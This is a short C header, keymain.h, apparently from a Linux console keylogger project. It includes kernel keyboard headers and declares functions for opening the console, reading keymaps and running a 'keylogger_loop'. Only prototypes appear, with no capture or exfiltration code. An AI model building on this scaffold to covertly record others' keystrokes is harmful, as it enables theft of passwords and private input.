/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   keymain.h                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/09/28 05:57:11 by root              #+#    #+#             */
/*   Updated: 2018/10/31 18:37:48 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef KEYMAIN_H
# define KEYMAIN_H

# include <stdlib.h>
# include <stdio.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <fcntl.h>
# include <unistd.h>
# include <sys/ioctl.h>
# include <linux/kd.h>
# include <errno.h>
# include <string.h>
# include <linux/keyboard.h>

# ifndef MAX_NR_KEYMAPS
#  define MAX_NR_KEYMAPS NR_KEYMAPS
# endif

int				get_console(void);
int				get_keymaps(int, int **, int);
int				**get_keys(int, int, int, int **);
char			*get_keyboard(void);
void			keylogger_loop(int, int **, int);

#endif
